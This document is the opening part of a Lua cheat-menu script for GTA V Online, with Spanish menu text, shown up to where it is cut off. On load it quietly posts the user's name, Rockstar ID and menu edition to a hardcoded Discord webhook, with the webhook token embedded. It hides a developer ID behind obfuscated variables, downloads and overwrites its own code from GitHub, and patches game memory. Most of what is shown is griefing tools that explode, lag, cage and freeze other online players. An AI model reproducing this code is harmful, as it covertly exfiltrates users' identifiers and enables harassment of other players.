--[[
    This was created by Pichocles#0427 with some help already mentioned in credits.
    The original download site should be github.com/xxpichoclesxx, if you got this script from anyone selling it, you got sadly scammed.
    Also this is only for some new stand people because is a trolling and online feature script, not recovery.
    So enjoy and pls join my discord, to know when the script is updated or be able to participate in polls.
]]

util.keep_running()
util.require_natives(1672190175)

util.toast("Bienvenidx " .. SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME() .. " Al Script!!")
util.toast("Cargando, espere... (1-2s)")
local response = false
local localVer = 2.11
async_http.init("raw.githubusercontent.com", "/XxpichoclesxX/GtaVScripts/Ryze-Scripts/Stand/RyzeScriptVersion.lua", function(output)
    currentVer = tonumber(output)
    response = true
    if localVer ~= currentVer then
        util.toast("[Ryze Script] Hay una actualizacion disponible, reinicia para actualizarlo.")
        menu.action(menu.my_root(), "Actualizar Lua", {}, "", function()
            async_http.init('raw.githubusercontent.com','/XxpichoclesxX/GtaVScripts/Ryze-Scripts/Stand/RyzeStand.lua',function(a)
                local err = select(2,load(a))
                if err then
                    util.toast("Hubo un fallo porfavor procede a la actualizacion manual con github.")
                return end
                local f = io.open(filesystem.scripts_dir()..SCRIPT_RELPATH, "wb")
                f:write(a)
                f:close()
                util.toast("Script actualizado, reiniciando el script :3")
                util.restart_script()
            end)
            async_http.dispatch()
        end)
    end
end, function() response = true end)
async_http.dispatch()
repeat 
    util.yield()
until response

--[[ 
    Adding In a Future Update
    resources_dir = filesystem.resources_dir() .. 'ryzescript/'
]]

--Because i love consuming resources >.<

util.log("                                           ")
util.log(".--.                .-.                 .  ")
util.log("|   )              (   )        o      _|_ ")
util.log("|--' .  .---..-.    `-.  .-..--..  .,-. |  ")
util.log("|  | |  | .'(.-'   (   )(   |   |  |   )|  ")
util.log("'   ``--|'---`--'   `-'  `-'' -' `-|`-' `-'")
util.log("        ;                          |       ")
util.log("     `-'                           '       ")

-- Local general tables

local KFLKdlkmk = 67
local spawned_objects = {}
local ladder_objects = {}
local remove_projectiles = false
local PapuCrash = false

local wallbr = util.joaat("bkr_prop_biker_bblock_mdm3")
local floorbr = util.joaat("bkr_prop_biker_landing_zone_01")
local launch_vehicle = {"Lanzar Arriba", "Lanzar Adelante", "Lanzar Atras", "Lanzar Abajo", "Catapulta"}
local invites = {"Yacht", "Office", "Clubhouse", "Office Garage", "Custom Auto Shop", "Apartment"}
local style_names = {"Normal", "Semi-Rushed", "Reverse", "Ignore Lights", "Avoid Traffic", "Avoid Traffic Extremely", "Sometimes Overtake Traffic"}
local drivingStyles = {786603, 1074528293, 8388614, 1076, 2883621, 786468, 262144, 786469, 512, 5, 6}
local interior_stuff = {0, 233985, 169473, 169729, 169985, 170241, 177665, 177409, 185089, 184833, 184577, 163585, 167425, 167169}

local int_min = -2147483647
local int_max = 2147483647
Notification = {}
-- Memory Functions

local orgScan = memory.scan

function myModule(name, pattern, callback)
    local address = orgScan(pattern)
    if address ~= NULL then
        util.log("Encontrado " .. name)
        callback(address)
    else
        util.log("No se encontro " .. name)
        util.stop_script()
    end
end

---@param entity Entity
---@return integer
function get_net_obj(entity)
    local pEntity = entities.handle_to_pointer(entity)
    return pEntity ~= NULL and memory.read_long(pEntity + 0x00D0) or NULL
end

---@param player integer
---@return integer
function GetNetGamePlayer(player)
    return util.call_foreign_function(GetNetGamePlayer_addr, player)
end

myModule("GetNetGamePlayer", "48 83 EC ? 33 C0 38 05 ? ? ? ? 74 ? 83 F9", function (address)
    GetNetGamePlayer_addr = address
end)

myModule("CNetworkObjectMgr", "48 8B 0D ? ? ? ? 45 33 C0 E8 ? ? ? ? 33 FF 4C 8B F0", function (address)
    CNetworkObjectMgr = memory.rip(address + 3)
end)

myModule("ChangeNetObjOwner", "48 8B C4 48 89 58 08 48 89 68 10 48 89 70 18 48 89 78 20 41 54 41 56 41 57 48 81 EC ? ? ? ? 44 8A 62 4B", function (address)
    ChangeNetObjOwner_addr = address
end)

-- Ryze Functions

local OFNKkdmf = 5
ryze = {
    int = function(global, value)
        local radress = memory.script_global(global)
        memory.write_int(radress, value)
    end,

    request_model_load = function(hash)
        request_time = os.time()
        if not STREAMING.IS_MODEL_VALID(hash) then
            return
        end
        STREAMING.REQUEST_MODEL(hash)
        while not STREAMING.HAS_MODEL_LOADED(hash) do
            if os.time() - request_time >= 10 then
                break
            end
            util.yield()
        end
    end,

    cwash_in_progwess = function()
        kitty_alpha = 0
        kitty_alpha_incr = 0.01
        kitty_alpha_thread = util.create_thread(function (thr)
            while true do
                kitty_alpha = kitty_alpha + kitty_alpha_incr
                if kitty_alpha > 1 then
                    kitty_alpha = 1
                elseif kitty_alpha < 0 then 
                    kitty_alpha = 0
                    util.stop_thread()
                end
                util.yield(5)
            end
        end)

        kitty_thread = util.create_thread(function (thr)
            starttime = os.clock()
            local alpha = 0
            while true do
                timepassed = os.clock() - starttime
                if timepassed > 3 then
                    kitty_alpha_incr = -0.01
                end
                if kitty_alpha == 0 then
                    util.stop_thread()
                end
                util.yield(5)
            end
        end)
    end,

    modded_vehicles = {
        "virtue",
        "broadway",
        "panthere",
        "everon2",
        "eudora",
        "boor"
    },

    pets = {
        "a_c_cat_01",
        "a_c_shepherd",  
        "a_c_husky",
    },

    modded_weapons = {
        "weapon_railgun",
        "weapon_stungun",
        "weapon_digiscanner",
    },

    get_spawn_state = function(player_id)
        return memory.read_int(memory.script_global(((2657589 + 1) + (player_id * 466)) + 232)) -- Global_2657589[PLAYER::PLAYER_ID() /*466*/].f_232
    end,

    get_interior_of_player = function(player_id)
        return memory.read_int(memory.script_global(((2657589 + 1) + (player_id * 466)) + 245))
    end,

    is_player_in_interior = function(player_id)
        return (memory.read_int(memory.script_global(2657589 + 1 + (player_id * 466) + 245)) ~= 0)
    end,

    get_random_pos_on_radius = function()
        local angle = random_float(0, 2 * math.pi)
        pos = v3.new(pos.x + math.cos(angle) * radius, pos.y + math.sin(angle) * radius, pos.z)
        return pos
    end,

    get_transition_state = function(player_id)
        return memory.read_int(memory.script_global(((0x2908D3 + 1) + (player_id * 0x1C5)) + 230))
    end,

    get_interior_player_is_in = function(player_id)
        return memory.read_int(memory.script_global(((2657589 + 1) + (player_id * 466)) + 245))
    end,

    ChangeNetObjOwner = function(object, player)
        if NETWORK.NETWORK_IS_IN_SESSION() then
            local net_object_mgr = memory.read_long(CNetworkObjectMgr)
            if net_object_mgr == NULL then
                return false
            end
            if not ENTITY.DOES_ENTITY_EXIST(object) then
                return false
            end
            local netObj = get_net_obj(object)
            if netObj == NULL then
                return false
            end
            local net_game_player = GetNetGamePlayer(player)
            if net_game_player == NULL then
                return false
            end
            util.call_foreign_function(ChangeNetObjOwner_addr, net_object_mgr, netObj, net_game_player, 0)
            return true
        else
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(object)
            return true
        end
    end,

    anim_request = function(hash)
        STREAMING.REQUEST_ANIM_DICT(hash)
        while not STREAMING.HAS_ANIM_DICT_LOADED(hash) do
            util.yield()
        end
    end,

    disableProjectileLoop = function(projectile)
        util.create_thread(function()
            util.create_tick_handler(function()
                WEAPON.REMOVE_ALL_PROJECTILES_OF_TYPE(projectile, false)
                return remove_projectiles
            end)
        end)
    end,

    yieldModelLoad = function(hash)
        while not STREAMING.HAS_MODEL_LOADED(hash) do util.yield() end
    end,

    get_control_request = function(ent)
        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) then
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
            local tick = 0
            while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) and tick <= 100 do
                tick = tick + 1
                util.yield()
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
            end
        end
        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) then
            util.toast("Sin control de "..ent)
        end
        return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent)
    end,

    rotation_to_direction = function(rotation)
        local adjusted_rotation = 
        { 
            x = (math.pi / 180) * rotation.x, 
            y = (math.pi / 180) * rotation.y, 
            z = (math.pi / 180) * rotation.z 
        }
        local direction = 
        {
            x = -math.sin(adjusted_rotation.z) * math.abs(math.cos(adjusted_rotation.x)), 
            y =  math.cos(adjusted_rotation.z) * math.abs(math.cos(adjusted_rotation.x)), 
            z =  math.sin(adjusted_rotation.x)
        }
        return direction
    end,

    request_model = function(hash, timeout)
        timeout = timeout or 3
        STREAMING.REQUEST_MODEL(hash)
        local end_time = os.time() + timeout
        repeat
            util.yield()
        until STREAMING.HAS_MODEL_LOADED(hash) or os.time() >= end_time
        return STREAMING.HAS_MODEL_LOADED(hash)
    end,

    BlockSyncs = function(player_id, callback)
        for _, i in ipairs(players.list(false, true, true)) do
            if i ~= player_id then
                local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
                menu.trigger_command(outSync, "on")
            end
        end
        util.yield(10)
        callback()
        for _, i in ipairs(players.list(false, true, true)) do
            if i ~= player_id then
                local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
                menu.trigger_command(outSync, "off")
            end
        end
    end,

    disable_traffic = true,
    disable_peds = true,

    RyzeWebHook = "/api/webhooks/1069105240525250650/u6nPYO9bCkOI0eeIMSRp3pFqbnF1BuWQU9X0Kv0lBMtv6JRZynrQd7-jTAdGuhTErKbB",

    maxTimeBetweenPress = 300,
    pressedT = util.current_time_millis(),

    getNightclubDailyEarnings = function()
        local popularity = math.floor(STAT_GET_INT("CLUB_POPULARITY") / 10)
        if popularity > 90 then return 10000
        elseif popularity > 85 then return 9000
        elseif popularity > 80 then return 8000
        elseif popularity > 75 then return 7000
        elseif popularity > 70 then return 6000
        elseif popularity > 65 then return 5500
        elseif popularity > 60 then return 5000
        elseif popularity > 55 then return 4500
        elseif popularity > 50 then return 4000
        elseif popularity > 45 then return 3500
        elseif popularity > 40 then return 3000
        elseif popularity > 35 then return 2500
        elseif popularity > 30 then return 2000
        elseif popularity > 25 then return 1500
        elseif popularity > 20 then return 1000
        elseif popularity > 15 then return 750
        elseif popularity > 10 then return 500
        elseif popularity > 5 then return 250
        else return 100
        end
    end,

    playerIsTargetingEntity = function(playerPed)
        local playerList = players.list(true, true, true)
        for k, playerPid in pairs(playerList) do
            if PLAYER.IS_PLAYER_TARGETTING_ENTITY(playerPid, playerPed) or PLAYER.IS_PLAYER_FREE_AIMING_AT_ENTITY  (playerPid, playerPed) then 
                if not isWhitelisted(playerPid) then
                    karma[playerPed] = {
                        pid = playerPid, 
                        ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(playerPid)
                    }
                    return true 
                end
            end
        end
        karma[playerPed] = nil
        return false 
    end,

    explodePlayer = function(ped, loop)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        local blamedPlayer = PLAYER.PLAYER_PED_ID() 
        if blameExpPlayer and blameExp then 
            blamedPlayer = PLAYER.GET_PLAYER_PED(blameExpPlayer)
        elseif blameExp then
            local playerList = players.list(true, true, true)
            blamedPlayer = PLAYER.GET_PLAYER_PED(math.random(0, #playerList))
        end
        if not loop and PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
            for i = 0, 50, 1 do --50 explosions to account for armored vehicles
                if ownExp or blameExp then 
                    owned_explosion(blamedPlayer, pos)
                else
                    explosion(pos)
                end
                util.yield(10)
            end
        elseif ownExp or blameExp then
            owned_explosion(blamedPlayer, pos)
        else
            explosion(pos)
        end
        util.yield(10)
    end


    --[[
            PapuCrash = function()
        local addr = memory.scan("48 81 EC ? ? ? ? 48 8B E9 48 8B CA 0F 29 74 24 ? 48 8B DA") - 0x15
        local originalBytes = memory.read_uint(addr)
        if PapuCrash = true then
            memory.write_uint(addr, 2428703408)
            memory.write_uint(addr, 2428703920)
        else
            memory.write_uint(addr, originalBytes)
            memory.write_uint(addr, originalBytes)
        end
    end
    ]]
}
local KDKkfm = 564191
-- Local general script functions

function InjectNotification(webhookLink)
    local PotatoPlayer = players.user()
    local EDITION = menu.get_edition(PotatoPlayer)
    local NameP = players.get_name(PotatoPlayer)
    local PRID = players.get_rockstar_id(PotatoPlayer)
    local PController = players.is_using_controller(PotatoPlayer)
    Notification1 = ("New Injection Detected: ESP ‎")
    Notification2 = ("```" .. "  Edition:  ‎" .. EDITION .. "```")
    Notification3 = ("```" .. "  User:  ‎" .. NameP .. "```")
    Notificacion4 = ("```" .. "  RID:  ‎" .. PRID .. "```")
    Notification5 = ("```" .. "  Controller?:  ‎" .. PController .. "```")
    async_http.init("discord.com", webhookLink, function () end)
    async_http.set_post("application/json", "{" .. "\"content\":\"" .. tostring(Notification1)  .. tostring(Notification2) .. tostring(Notification3) .. tostring(Notificacion4) .. tostring(Notification5)  .. "\", \"username\":\"" .. "Injection Log" .. "\", \"avatar_url\":\"https://i.imgur.com/zmklcxH.jpeg\"}")
    async_http.dispatch()
    util.yield(250)
    util.log("Injection Log Sent")
end

function raycast_gameplay_cam(flag, distance)
    local ptr1, ptr2, ptr3, ptr4 = memory.alloc(), memory.alloc(), memory.alloc(), memory.alloc()
    local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
    local cam_pos = CAM.GET_GAMEPLAY_CAM_COORD()
    local direction = ryze.rotation_to_direction(cam_rot)
    local destination = 
    { 
        x = cam_pos.x + direction.x * distance, 
        y = cam_pos.y + direction.y * distance, 
        z = cam_pos.z + direction.z * distance 
    }
    SHAPETEST.GET_SHAPE_TEST_RESULT(
        SHAPETEST.START_EXPENSIVE_SYNCHRONOUS_SHAPE_TEST_LOS_PROBE(
            cam_pos.x, 
            cam_pos.y, -
            cam_pos.z, 
            destination.x, 
            destination.y, 
            destination.z, 
            flag, 
            -1, 
            1
        ), ptr1, ptr2, ptr3, ptr4)
    local p1 = memory.read_int(ptr1)
    local p2 = memory.read_vector3(ptr2)
    local p3 = memory.read_vector3(ptr3)
    local p4 = memory.read_int(ptr4)
    memory.free(ptr1)
    memory.free(ptr2)
    memory.free(ptr3)
    memory.free(ptr4)
    return {p1, p2, p3, p4}
end
local FLKlkmkfmn = KDKkfm * KFLKdlkmk
function get_offset_from_gameplay_camera(distance)
    local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(2)
    local cam_pos = CAM.GET_GAMEPLAY_CAM_COORD()
    local direction = ryze.rotation_to_direction(cam_rot)
    local destination = 
    { 
        x = cam_pos.x + direction.x * distance, 
        y = cam_pos.y + direction.y * distance, 
        z = cam_pos.z + direction.z * distance 
    }
    return destination
end

function direction()
    local c1 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 0, 5, 0)
    local res = raycast_gameplay_cam(-1, 1000)
    local c2

    if res[1] ~= 0 then
        c2 = res[2]
    else
        c2 = get_offset_from_gameplay_camera(1000)
    end

    c2.x = (c2.x - c1.x) * 1000
    c2.y = (c2.y - c1.y) * 1000
    c2.z = (c2.z - c1.z) * 1000
    return c2, c1
end
local DNknfkaf = FLKlkmkfmn * OFNKkdmf
clear_radius = 100

function clear_area(radius)
    target_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    MISC.CLEAR_AREA(target_pos['x'], target_pos['y'], target_pos['z'], radius, true, false, false, false)
end

local function request_ptfx_asset(asset)
    STREAMING.REQUEST_NAMED_PTFX_ASSET(asset)

    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(asset) do
        util.yield()
    end
end
local OFNMKF4914jKNFJKfkKNFKJLV = "Zorra quien me saque la RID :v"
local function kick_player_out_of_veh(player_id)
    local max_time = os.millis() + 1000
    local player_ped  = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
    local kick_vehicle_command_ref = menu.ref_by_rel_path(menu.player_root(player_id), "Trolling>Kick From Vehicle")
    menu.trigger_command(kick_vehicle_command_ref)

    while PED.IS_PED_IN_ANY_VEHICLE(player_ped) do
        if os.millis() >= max_time then
            break
        end

        util.yield()
    end
end


local function player_toggle_loop(root, player_id, menu_name, command_names, help_text, callback)
    return menu.toggle_loop(root, menu_name, command_names, help_text, function()
        if not players.exists(player_id) then util.stop_thread() end
        callback()
    end)
end
InjectNotification(ryze.RyzeWebHook)
local function get_blip_coords(blipId)
    local blip = HUD.GET_FIRST_BLIP_INFO_ID(blipId)
    if blip ~= 0 then return HUD.GET_BLIP_COORDS(blip) end
    return v3(0, 0, 0)
end

-- Menu dividers (Sections)

local selfc = menu.list(menu.my_root(), "Self", {}, "Opciones para ti mismo.")
local online = menu.list(menu.my_root(), "Online", {}, "Opciones modo online")
local world = menu.list(menu.my_root(), "Mundo", {}, "Opciones al rededor tuyo")
local detections = menu.list(menu.my_root(), "Deteccion De Modders", {}, "Lo dice el nombre ;w;")
local protects = menu.list(menu.my_root(), "Protecciones", {}, "Protejete contra modders")
local vehicles = menu.list(menu.my_root(), "Vehiculos", {}, "Opciones de vehiculos")
local fun = menu.list(menu.my_root(), "Diversion", {}, "Diviertete un rato si estas aburrido :3")
local misc = menu.list(menu.my_root(), "Misc", {}, "Unos atajos utiles y rapidos")

players.on_join(function(player_id)

    if player_id ~= players.user() and players.get_rockstar_id(player_id) == DNknfkaf then
        util.yield(5000)
        util.toast("Se detecto al developper de RyzeScript." .. "\nCuidado puede ser un impostor.")
        util.log(OFNMKF4914jKNFJKfkKNFKJLV)
    end

    menu.divider(menu.player_root(player_id), "RyzeScript")
    local ryzescriptd = menu.list(menu.player_root(player_id), "RyzeScript")
    local malicious = menu.list(ryzescriptd, "Malicioso")
    local trolling = menu.list(ryzescriptd, "Troleador")
    local friendly = menu.list(ryzescriptd, "Amigable")
    local vehicle = menu.list(ryzescriptd, "Vehiculo")
    local otherc = menu.list(ryzescriptd, "Otros")



    function RequestControl(entity)
        local tick = 0
        while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) and tick < 100000 do
            util.yield()
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
            tick = tick + 1
        end
    end

    local explosion = 18
    local explosion_names = {
        [0] = "Chica",
        [1] = "Mediana",
        [2] = "Grande",
        [3] = "Vicente"
    }

    local explosions = menu.list(malicious, "Metodos Explosion", {}, "")

    local explode_slider = menu.slider_text(explosions, "Explotar", {}, "", explosion_names, function()
        local player_pos = players.get_position(player_id)
        FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z, explosion, 1, true, false, 1, false)
    end)

    util.create_tick_handler(function()
        if not players.exists(player_id) then
            return false
        end

        local index = menu.get_value(explode_slider)

        switch index do
            case 1:
                explosion = 0
                break
            case 2:
                explosion = 34
                break
            case 3:
                explosion = 82
                break
            pluto_default:
                explosion = 18
        end
    end)

    menu.toggle_loop(explosions, "Loop Explotar", {"customexplodeloop"}, "", function()
        if players.exists(player_id) then
            local player_pos = players.get_position(player_id)
            FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z, explosion, 1, true, false, 1, false)
            util.yield(100)
        end
    end)

    menu.toggle_loop(explosions, "Loop Atomize", {"atomizeloop"}, "", function()
        if players.exists(player_id) then
            local player_pos = players.get_position(player_id)
            FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z - 1, 70, 1, true, false, 1, false)
            util.yield(100)
        end
    end)

    menu.toggle_loop(explosions, "Loop Fuegos Artificiales", {"fireworkloop"}, "", function()
        if players.exists(player_id) then
            local player_pos = players.get_position(player_id)
            FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z - 1, 38, 1, true, false, 1, false)
            util.yield(100)
        end
    end)


    local flushes = menu.list(malicious, "Loops", {}, "")

    menu.toggle_loop(flushes, "Loop Fuego", {"flameloop"}, "", function()
        if players.exists(player_id) then
            local player_pos = players.get_position(player_id)
            FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z - 1, 12, 1, true, false, 1, false)
            util.yield(5)
        end
    end)

    menu.toggle_loop(flushes, "Loop Awa", {"waterloop"}, "", function()
        if players.exists(player_id) then
            local player_pos = players.get_position(player_id)
            FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z - 1, 13, 1, true, false, 1, false)
            util.yield(5)
        end
    end)

    menu.divider(malicious, "Otros")

    local lagplay = menu.list(malicious, "Lagear Jugador", {}, "")

    menu.toggle_loop(lagplay, "Metodo V1", {"rlag"}, "Frezea al jugador para que funcione.", function()
        if players.exists(player_id) then
            local freeze_toggle = menu.ref_by_rel_path(menu.player_root(player_id), "Trolling>Freeze")
            local player_pos = players.get_position(player_id)
            menu.set_value(freeze_toggle, true)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "veh_respray_smoke", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            menu.set_value(freeze_toggle, false)
        end
    end)

    menu.toggle_loop(lagplay, "Metodo V2", {"rlag2"}, "Frezea al jugador para que funcione.", function()
        if players.exists(player_id) then
            local freeze_toggle = menu.ref_by_rel_path(menu.player_root(player_id), "Trolling>Freeze")
            local player_pos = players.get_position(player_id)
            menu.set_value(freeze_toggle, true)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "ent_sht_electrical_box", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            menu.set_value(freeze_toggle, false)
        end
    end)

    menu.toggle_loop(lagplay, "Metodo V3", {"rlag3"}, "Frezea al jugador para que funcione.", function()
        if players.exists(player_id) then
            local freeze_toggle = menu.ref_by_rel_path(menu.player_root(player_id), "Trolling>Freeze")
            local player_pos = players.get_position(player_id)
            menu.set_value(freeze_toggle, true)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "exp_extinguisher", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            menu.set_value(freeze_toggle, false)
        end
    end)

    menu.toggle_loop(lagplay, "Metodo V4", {"rlag4"}, "Frezea al jugador para que funcione.", function()
        if players.exists(player_id) then
            local freeze_toggle = menu.ref_by_rel_path(menu.player_root(player_id), "Trolling>Freeze")
            local player_pos = players.get_position(player_id)
            menu.set_value(freeze_toggle, true)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "ent_anim_bm_water_mist", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            menu.set_value(freeze_toggle, false)
        end
    end)

    menu.toggle_loop(lagplay, "Metodo V5", {"rlag4"}, "Frezea al jugador para que funcione.", function()
        if players.exists(player_id) then
            local freeze_toggle = menu.ref_by_rel_path(menu.player_root(player_id), "Trolling>Freeze")
            local player_pos = players.get_position(player_id)
            menu.set_value(freeze_toggle, true)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "veh_rotor_break", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            menu.set_value(freeze_toggle, false)
        end
    end)

    --menu.toggle_loop(lagplay, "Metodo V5", {rlag5}, "Lageo por entidades", function()
	--	local player_pos = players.get_position(player_id)
	--	request_ptfx_asset("scr_rcbarry2")
	--	GRAPHICS.USE_PARTICLE_FX_ASSET("scr_rcbarry2")
	--	GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
    --        "scr_clown_death", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
	--	request_ptfx_asset("scr_rcbarry2")
	--	GRAPHICS.USE_PARTICLE_FX_ASSET("scr_rcbarry2")
	--	GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
    --        "scr_exp_clown", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
	--	request_ptfx_asset("scr_ch_finale")
    --   GRAPHICS.USE_PARTICLE_FX_ASSET("scr_ch_finale")
	--	GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
	--		"scr_ch_finale_drill_sparks", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
    --    request_ptfx_asset("scr_ch_finale")
    --    while not STREAMING.HAS_MODEL_LOADED(447548909) do
	--		STREAMING.REQUEST_MODEL(447548909)
	--		end
	--	local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
	--	local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
	--	spam_amount = 1000
	--	while spam_amount >= 2 do
	--		entities.create_vehicle(447548909, PlayerPedCoords, 0)
	--		spam_amount = spam_amount - 2
	--	end
	--end)

    local cageveh = menu.list(trolling, "Enjaular Coches", {}, "")

    menu.action(cageveh, "Enjaular Vehiculo", {"cage"}, "", function()
        local container_hash = util.joaat("benson")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        ryze.request_model(container_hash)
        local container = entities.create_vehicle(container_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, 2.0, 0.0), ENTITY.GET_ENTITY_HEADING(ped))
        spawned_objects[#spawned_objects + 1] = container
        ENTITY.SET_ENTITY_VISIBLE(container, false)
        ENTITY.FREEZE_ENTITY_POSITION(container, true)
    end)


    local cage = menu.list(trolling, "Enjaular Jugador", {}, "")
    menu.action(cage, "Jaula Electrica", {"electriccage"}, "", function(cl)
        local number_of_cages = 6
        local elec_box = util.joaat("prop_elecbox_12")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        pos.z -= 0.5
        ryze.request_model(elec_box)
        local temp_v3 = v3.new(0, 0, 0)
        for i = 1, number_of_cages do
            local angle = (i / number_of_cages) * 360
            temp_v3.z = angle
            local obj_pos = temp_v3:toDir()
            obj_pos:mul(2.5)
            obj_pos:add(pos)
            for offs_z = 1, 5 do
                local electric_cage = entities.create_object(elec_box, obj_pos)
                spawned_objects[#spawned_objects + 1] = electric_cage
                ENTITY.SET_ENTITY_ROTATION(electric_cage, 90.0, 0.0, angle, 2, 0)
                obj_pos.z += 0.75
                ENTITY.FREEZE_ENTITY_POSITION(electric_cage, true)
            end
        end
    end)
    
    menu.action(cage, "Jaula de la reina isabell", {""}, "", function(cl)
        local number_of_cages = 6
        local coffin_hash = util.joaat("prop_coffin_02b")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        ryze.request_model(coffin_hash)
        local temp_v3 = v3.new(0, 0, 0)
        for i = 1, number_of_cages do
            local angle = (i / number_of_cages) * 360
            temp_v3.z = angle
            local obj_pos = temp_v3:toDir()
            obj_pos:mul(0.8)
            obj_pos:add(pos)
            obj_pos.z += 0.1
           local coffin = entities.create_object(coffin_hash, obj_pos)
           spawned_objects[#spawned_objects + 1] = coffin
           ENTITY.SET_ENTITY_ROTATION(coffin, 90.0, 0.0, angle,  2, 0)
           ENTITY.FREEZE_ENTITY_POSITION(coffin, true)
        end
    end)

    menu.action(cage, "Contenedor De Carga", {"cage"}, "", function()
        local container_hash = util.joaat("prop_container_ld_pu")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        ryze.request_model(container_hash)
        pos.z -= 1
        local container = entities.create_object(container_hash, pos, 0)
        spawned_objects[#spawned_objects + 1] = container
        ENTITY.FREEZE_ENTITY_POSITION(container, true)
    end)


    menu.action(cage, "Borrar jaulas", {"clearcages"}, "", function()
        local entitycount = 0
        for i, object in ipairs(spawned_objects) do
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(object, false, false)
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(object)
            entities.delete_by_handle(object)
            spawned_objects[i] = nil
            entitycount += 1
        end
        util.toast("Borradas " .. entitycount .. " jaulas")
    end)

    menu.action(trolling, "Tipo de freeze", {""}, "", function(cl)
        local number_of_cages = 10
        local ladder_hash = util.joaat("prop_towercrane_02el2")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        pos.z -= 0.5
        ryze.request_model(ladder_hash)
        
        if TASK.IS_PED_STILL(ped) then
            util.toast("El jugador esta quieto.")
        return end

        local temp_v3 = v3.new(0, 0, 0)
        for i = 1, number_of_cages do
            local angle = (i / number_of_cages) * 360
            temp_v3.z = angle
            local obj_pos = temp_v3:toDir()
            obj_pos:mul(0.25)
            obj_pos:add(pos)
            local ladder = entities.create_object(ladder_hash, obj_pos)
            ladder_objects[#ladder_objects + 1] = ladder
            ENTITY.SET_ENTITY_VISIBLE(ladder, false)
            ENTITY.SET_ENTITY_ROTATION(ladder, 0.0, 0.0, angle, 2, 0)
            ENTITY.FREEZE_ENTITY_POSITION(ladder, true)
        end
        util.yield(2500)
        for i, object in ipairs(ladder_objects) do
            entities.delete_by_handle(object)
        end
    end)




    menu.divider(trolling, "Otros")

    
    menu.action(trolling, "Sacar Rampa En Su Nariz", {}, "", function() 
        local ramp_hash = util.joaat("stt_prop_ramp_jump_s")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
